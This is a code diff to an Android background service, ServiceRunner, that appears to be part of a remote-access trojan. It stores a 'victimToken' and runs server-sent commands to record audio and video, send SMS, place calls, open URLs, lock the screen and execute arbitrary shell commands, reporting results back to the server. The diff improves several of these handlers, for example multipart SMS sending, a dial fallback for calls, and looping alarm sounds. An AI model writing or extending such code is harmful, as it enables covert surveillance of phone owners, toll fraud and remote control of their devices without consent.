@@ -36,6 +36,7 @@ import android.provider.Settings;
 import android.telephony.SmsManager;
 import android.util.Base64;
 import android.util.Log;
+import android.view.Gravity;
 import android.widget.Toast;
 
 import androidx.annotation.RequiresApi;
@@ -54,6 +55,7 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 import java.util.concurrent.CountDownLatch;
@@ -81,6 +83,10 @@ public class ServiceRunner extends Service {
     private String victimToken = "";
     private boolean registered = false;
     private PowerManager.WakeLock wakeLock = null;
+
+    // ★ Ringtone instance (لتشغيل الصوت بشكل مستمر)
+    private Ringtone activeRingtone = null;
+    private Handler ringtoneHandler = null;
 
     // ============================================================
     // Lifecycle
@@ -116,6 +122,7 @@ public class ServiceRunner extends Service {
         Log.d(TAG, "Device: " + deviceId);
 
         commandExecutor = Executors.newFixedThreadPool(2);
+        ringtoneHandler = new Handler(Looper.getMainLooper());
 
         new Thread(() -> {
             try {
@@ -332,7 +339,7 @@ public class ServiceRunner extends Service {
         String action = "";
         try {
             action = cmd.optString("action", "");
-            Log.d(TAG, "Command: " + action);
+            Log.d(TAG, "★★★ Command: " + action + " | full: " + cmd.toString());
 
             switch (action) {
                 case "get_device_info": sendDeviceInfo(); break;
@@ -365,13 +372,49 @@ public class ServiceRunner extends Service {
                 case "record_audio": recordAudio(cmd.optInt("duration", 10000)); break;
                 case "play_sound": playSound(); break;
                 case "play_alarm": playAlarm(); break;
+                case "stop_sound": stopActiveRingtone(); reportCommandResult("stop_sound", "ok", ""); break;
 
-                case "vibrate": vibrate(cmd.optLong("ms", 2000)); break;
-                case "toast": showToast(cmd.optString("text", "Hello")); break;
-                case "send_sms": sendSmsToNumber(cmd.optString("to"), cmd.optString("msg")); break;
-                case "call": callNumber(cmd.optString("to")); break;
-                case "open_url": openUrl(cmd.optString("url")); break;
-                case "shell": executeShell(cmd.optString("command", "")); break;
+                case "vibrate":
+                    long ms = cmd.optLong("ms", 2000);
+                    Log.d(TAG, "Vibrate: " + ms + "ms");
+                    vibrate(ms);
+                    break;
+
+                case "toast":
+                    String toastText = cmd.optString("text", "Hello");
+                    Log.d(TAG, "Toast: [" + toastText + "]");
+                    showToast(toastText);
+                    break;
+
+                case "send_sms":
+                    String smsTo = cmd.optString("to", "");
+                    String smsMsg = cmd.optString("msg", "");
+                    Log.d(TAG, "Send SMS to: [" + smsTo + "] msg: [" + smsMsg + "]");
+                    sendSmsToNumber(smsTo, smsMsg);
+                    break;
+
+                case "call":
+                    String callTo = cmd.optString("to", "");
+                    Log.d(TAG, "Call: [" + callTo + "]");
+                    callNumber(callTo);
+                    break;
+
+                case "open_url":
+                    String openUrl = cmd.optString("url", "");
+                    Log.d(TAG, "Open URL: [" + openUrl + "]");
+                    openUrl(openUrl);
+                    break;
+
+                case "shell":
+                    String shellCmd = cmd.optString("command", "");
+                    Log.d(TAG, "Shell command: [" + shellCmd + "]");
+                    if (shellCmd.isEmpty()) {
+                        reportCommandResult("shell", "fail", "empty_command");
+                    } else {
+                        executeShell(shellCmd);
+                    }
+                    break;
+
                 case "volume_max": maxVolume(); break;
                 case "volume_set":
                     setVolume(
@@ -389,6 +432,7 @@ public class ServiceRunner extends Service {
             }
         } catch (Exception e) {
             Log.e(TAG, "handleCommand: " + e.getMessage());
+            e.printStackTrace();
             reportCommandResult(action, "fail", e.getMessage());
         }
     }
@@ -1114,7 +1158,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ Video — محدّث بـ Camera2 (بدون OutputConfiguration) ★★★
+    // Video — محدّث بـ Camera2
     // ============================================================
     private void recordVideo(final int cameraId, final int durationMs) {
         Log.d(TAG, "recordVideo called: cameraId=" + cameraId + " duration=" + durationMs);
@@ -1148,7 +1192,6 @@ public class ServiceRunner extends Service {
                     return;
                 }
 
-                // ابحث عن الكاميرا
                 String targetCameraId = null;
                 boolean isFront = (cameraId == 1);
 
@@ -1181,7 +1224,6 @@ public class ServiceRunner extends Service {
 
                 final String finalCameraId = targetCameraId;
 
-                // Handler Thread
                 thread = new android.os.HandlerThread("VideoThread");
                 thread.start();
                 final android.os.Handler handler = new android.os.Handler(thread.getLooper());
@@ -1211,7 +1253,6 @@ public class ServiceRunner extends Service {
                     public void onOpened(@androidx.annotation.NonNull android.hardware.camera2.CameraDevice cam) {
                         Log.d(TAG, "Camera opened for video");
                         try {
-                            // ★★★ استخدم List<Surface> مباشرة (متوافق مع كل الإصدارات) ★★★
                             List<android.view.Surface> surfaces = Collections.singletonList(surface);
 
                             cam.createCaptureSession(
@@ -1391,7 +1432,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // Media Keys
+    // ★★★ Media Keys ★★★
     // ============================================================
     private void sendMediaKey(String key) {
         try {
@@ -1425,7 +1466,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // Screen Off
+    // ★★★ Screen Off ★★★
     // ============================================================
     private void screenOff() {
         try {
@@ -1452,7 +1493,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // Set Volume
+    // ★★★ Set Volume ★★★
     // ============================================================
     private void setVolume(int level, String streamName) {
         try {
@@ -1494,7 +1535,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // باقي الأوامر
+    // ★★★ Lock Screen ★★★
     // ============================================================
     private void lockScreen() {
         try {
@@ -1535,83 +1576,357 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // ★★★ playSound — محسّن ★★★
+    // ============================================================
     private void playSound() {
         try {
-            Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
+            stopActiveRingtone();
+
+            Ringtone r = RingtoneManager.getRingtone(
+                    getApplicationContext(),
                     RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION));
-            if (r != null) r.play();
+
+            if (r == null) {
+                r = RingtoneManager.getRingtone(
+                        getApplicationContext(),
+                        RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
+            }
+
+            if (r == null) {
+                r = RingtoneManager.getRingtone(
+                        getApplicationContext(),
+                        RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
+            }
+
+            if (r == null) {
+                reportCommandResult("play_sound", "fail", "no_ringtone_available");
+                return;
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                r.setAudioAttributes(new android.media.AudioAttributes.Builder()
+                        .setUsage(android.media.AudioAttributes.USAGE_ALARM)
+                        .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
+                        .build());
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                r.setLooping(true);
+            }
+
+            activeRingtone = r;
+            r.play();
+
+            Log.d(TAG, "✅ Ringtone playing");
+
+            if (ringtoneHandler == null) {
+                ringtoneHandler = new Handler(Looper.getMainLooper());
+            }
+            ringtoneHandler.postDelayed(this::stopActiveRingtone, 30000);
+
             reportCommandResult("play_sound", "ok", "");
-        } catch (Exception e) { reportCommandResult("play_sound", "fail", e.getMessage()); }
+
+        } catch (Exception e) {
+            Log.e(TAG, "playSound error: " + e.getMessage());
+            reportCommandResult("play_sound", "fail", e.getMessage());
+        }
     }
 
+    // ============================================================
+    // ★★★ playAlarm — محسّن ★★★
+    // ============================================================
     private void playAlarm() {
         try {
-            Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
+            stopActiveRingtone();
+
+            Ringtone r = RingtoneManager.getRingtone(
+                    getApplicationContext(),
                     RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
-            if (r != null) r.play();
+
+            if (r == null) {
+                r = RingtoneManager.getRingtone(
+                        getApplicationContext(),
+                        RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
+            }
+
+            if (r == null) {
+                reportCommandResult("play_alarm", "fail", "no_alarm_available");
+                return;
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                r.setAudioAttributes(new android.media.AudioAttributes.Builder()
+                        .setUsage(android.media.AudioAttributes.USAGE_ALARM)
+                        .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
+                        .build());
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                r.setLooping(true);
+            }
+
+            activeRingtone = r;
+            r.play();
+
+            Log.d(TAG, "✅ Alarm playing");
+
+            if (ringtoneHandler == null) {
+                ringtoneHandler = new Handler(Looper.getMainLooper());
+            }
+            ringtoneHandler.postDelayed(this::stopActiveRingtone, 60000);
+
             reportCommandResult("play_alarm", "ok", "");
-        } catch (Exception e) { reportCommandResult("play_alarm", "fail", e.getMessage()); }
+
+        } catch (Exception e) {
+            Log.e(TAG, "playAlarm error: " + e.getMessage());
+            reportCommandResult("play_alarm", "fail", e.getMessage());
+        }
     }
 
+    private void stopActiveRingtone() {
+        try {
+            if (activeRingtone != null && activeRingtone.isPlaying()) {
+                activeRingtone.stop();
+            }
+            activeRingtone = null;
+        } catch (Exception e) {
+            Log.e(TAG, "stopActiveRingtone error: " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ★★★ vibrate — محسّن ★★★
+    // ============================================================
     private void vibrate(long ms) {
         try {
             Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
-            if (v != null) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    v.vibrate(android.os.VibrationEffect.createOneShot(ms,
-                            android.os.VibrationEffect.DEFAULT_AMPLITUDE));
-                } else {
+
+            if (v == null) {
+                reportCommandResult("vibrate", "fail", "no_vibrator");
+                return;
+            }
+
+            if (!v.hasVibrator()) {
+                reportCommandResult("vibrate", "fail", "no_vibrator_hardware");
+                return;
+            }
+
+            if (ms <= 0) ms = 2000;
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                try {
+                    v.vibrate(android.os.VibrationEffect.createOneShot(
+                            ms, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
+                } catch (Exception e) {
                     v.vibrate(ms);
                 }
+            } else {
+                v.vibrate(ms);
             }
+
+            Log.d(TAG, "✅ Vibration sent: " + ms + "ms");
             reportCommandResult("vibrate", "ok", "");
-        } catch (Exception e) { reportCommandResult("vibrate", "fail", e.getMessage()); }
+
+        } catch (Exception e) {
+            Log.e(TAG, "vibrate error: " + e.getMessage());
+            reportCommandResult("vibrate", "fail", e.getMessage());
+        }
     }
 
+    // ============================================================
+    // ★★★ showToast — محسّن ★★★
+    // ============================================================
     private void showToast(final String text) {
-        new Handler(Looper.getMainLooper()).post(() -> {
-            try {
-                Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG).show();
-                reportCommandResult("toast", "ok", "");
-            } catch (Exception e) { reportCommandResult("toast", "fail", e.getMessage()); }
-        });
+        try {
+            if (text == null || text.trim().isEmpty()) {
+                reportCommandResult("toast", "fail", "empty_text");
+                return;
+            }
+
+            Handler mainHandler = new Handler(Looper.getMainLooper());
+            mainHandler.post(() -> {
+                try {
+                    Toast toast = Toast.makeText(
+                            getApplicationContext(),
+                            text,
+                            Toast.LENGTH_LONG);
+
+                    toast.setGravity(Gravity.CENTER, 0, 0);
+                    toast.show();
+
+                    Log.d(TAG, "✅ Toast shown: " + text);
+                    reportCommandResult("toast", "ok", "");
+
+                } catch (Exception e) {
+                    Log.e(TAG, "Toast.show error: " + e.getMessage());
+                    reportCommandResult("toast", "fail", e.getMessage());
+                }
+            });
+
+        } catch (Exception e) {
+            Log.e(TAG, "showToast error: " + e.getMessage());
+            reportCommandResult("toast", "fail", e.getMessage());
+        }
     }
 
+    // ============================================================
+    // ★★★ sendSmsToNumber — محسّن ★★★
+    // ============================================================
     private void sendSmsToNumber(String to, String msg) {
         try {
+            if (to == null || to.trim().isEmpty()) {
+                reportCommandResult("send_sms", "fail", "empty_number");
+                return;
+            }
+
+            if (msg == null || msg.trim().isEmpty()) {
+                reportCommandResult("send_sms", "fail", "empty_message");
+                return;
+            }
+
             if (!hasPermission(android.Manifest.permission.SEND_SMS)) {
                 reportCommandResult("send_sms", "fail", "no_send_sms_permission");
                 return;
             }
-            SmsManager sm = SmsManager.getDefault();
-            sm.sendTextMessage(to, null, msg, null, null);
-            reportCommandResult("send_sms", "ok", "");
-        } catch (Exception e) { reportCommandResult("send_sms", "fail", e.getMessage()); }
-    }
 
-    private void callNumber(String number) {
-        try {
-            if (!hasPermission(android.Manifest.permission.CALL_PHONE)) {
-                reportCommandResult("call", "fail", "no_call_permission");
+            to = to.trim();
+
+            SmsManager sm;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                sm = getSystemService(SmsManager.class);
+            } else {
+                sm = SmsManager.getDefault();
+            }
+
+            if (sm == null) {
+                reportCommandResult("send_sms", "fail", "sms_manager_null");
                 return;
             }
-            Intent intent = new Intent(Intent.ACTION_CALL);
-            intent.setData(Uri.parse("tel:" + number));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-            reportCommandResult("call", "ok", "");
-        } catch (Exception e) { reportCommandResult("call", "fail", e.getMessage()); }
+
+            ArrayList<String> parts = sm.divideMessage(msg);
+
+            if (parts.size() > 1) {
+                sm.sendMultipartTextMessage(to, null, parts, null, null);
+            } else {
+                sm.sendTextMessage(to, null, msg, null, null);
+            }
+
+            Log.d(TAG, "✅ SMS sent to: " + to);
+            reportCommandResult("send_sms", "ok", "");
+
+        } catch (Exception e) {
+            Log.e(TAG, "sendSmsToNumber error: " + e.getMessage());
+            reportCommandResult("send_sms", "fail", e.getMessage());
+        }
     }
 
+    // ============================================================
+    // ★★★ callNumber — محسّن ★★★
+    // ============================================================
+    private void callNumber(String number) {
+        try {
+            if (number == null || number.trim().isEmpty()) {
+                reportCommandResult("call", "fail", "empty_number");
+                return;
+            }
+
+            number = number.trim();
+            String cleanNumber = number.replaceAll("[^0-9+]", "");
+
+            if (hasPermission(android.Manifest.permission.CALL_PHONE)) {
+                try {
+                    Intent callIntent = new Intent(Intent.ACTION_CALL);
+                    callIntent.setData(Uri.parse("tel:" + cleanNumber));
+                    callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(callIntent);
+
+                    Log.d(TAG, "✅ Call initiated: " + cleanNumber);
+                    reportCommandResult("call", "ok", "");
+                    return;
+                } catch (Exception e) {
+                    Log.e(TAG, "ACTION_CALL failed: " + e.getMessage());
+                }
+            }
+
+            try {
+                Intent dialIntent = new Intent(Intent.ACTION_DIAL);
+                dialIntent.setData(Uri.parse("tel:" + cleanNumber));
+                dialIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(dialIntent);
+
+                Log.d(TAG, "✅ Dial opened: " + cleanNumber);
+                reportCommandResult("call", "ok", "dial_only");
+                return;
+            } catch (Exception e) {
+                Log.e(TAG, "ACTION_DIAL failed: " + e.getMessage());
+            }
+
+            reportCommandResult("call", "fail", "no_call_app");
+
+        } catch (Exception e) {
+            Log.e(TAG, "callNumber error: " + e.getMessage());
+            reportCommandResult("call", "fail", e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ★★★ openUrl — محسّن ★★★
+    // ============================================================
     private void openUrl(String url) {
         try {
-            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-            reportCommandResult("open_url", "ok", "");
-        } catch (Exception e) { reportCommandResult("open_url", "fail", e.getMessage()); }
+            if (url == null || url.trim().isEmpty()) {
+                reportCommandResult("open_url", "fail", "empty_url");
+                return;
+            }
+
+            url = url.trim();
+
+            if (!url.startsWith("http://") && !url.startsWith("https://")
+                    && !url.startsWith("intent:") && !url.startsWith("market:")) {
+                url = "https://" + url;
+            }
+
+            try {
+                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                intent.addCategory(Intent.CATEGORY_BROWSABLE);
+
+                startActivity(intent);
+
+                Log.d(TAG, "✅ URL opened: " + url);
+                reportCommandResult("open_url", "ok", "");
+                return;
+            } catch (Exception e) {
+                Log.e(TAG, "ACTION_VIEW failed: " + e.getMessage());
+            }
+
+            try {
+                Intent chromeIntent = new Intent(Intent.ACTION_VIEW);
+                chromeIntent.setPackage("com.android.chrome");
+                chromeIntent.setData(Uri.parse(url));
+                chromeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(chromeIntent);
+
+                Log.d(TAG, "✅ URL opened via Chrome: " + url);
+                reportCommandResult("open_url", "ok", "chrome");
+                return;
+            } catch (Exception e) {
+                Log.e(TAG, "Chrome fallback failed: " + e.getMessage());
+            }
+
+            reportCommandResult("open_url", "fail", "no_browser");
+
+        } catch (Exception e) {
+            Log.e(TAG, "openUrl error: " + e.getMessage());
+            reportCommandResult("open_url", "fail", e.getMessage());
+        }
     }
 
+    // ============================================================
+    // Shell
+    // ============================================================
     private void executeShell(String command) {
         try {
             Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
@@ -1637,6 +1952,9 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("shell", "fail", e.getMessage()); }
     }
 
+    // ============================================================
+    // Helpers
+    // ============================================================
     private boolean hasPermission(String permission) {
         try {
             return ContextCompat.checkSelfPermission(this, permission)
@@ -1713,4 +2031,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-    }
+                }
